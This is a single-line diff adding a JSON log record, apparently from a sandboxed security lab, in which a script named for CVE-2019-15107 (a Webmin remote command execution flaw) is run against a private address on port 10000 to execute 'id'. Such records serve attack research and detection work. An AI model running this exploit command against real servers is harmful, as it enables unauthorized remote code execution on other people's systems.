@@ -1,0 +1,1 @@
+{"sandbox_id": "66", "timestamp_str": "2020-07-15T11:00:33.343231+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'id'"}
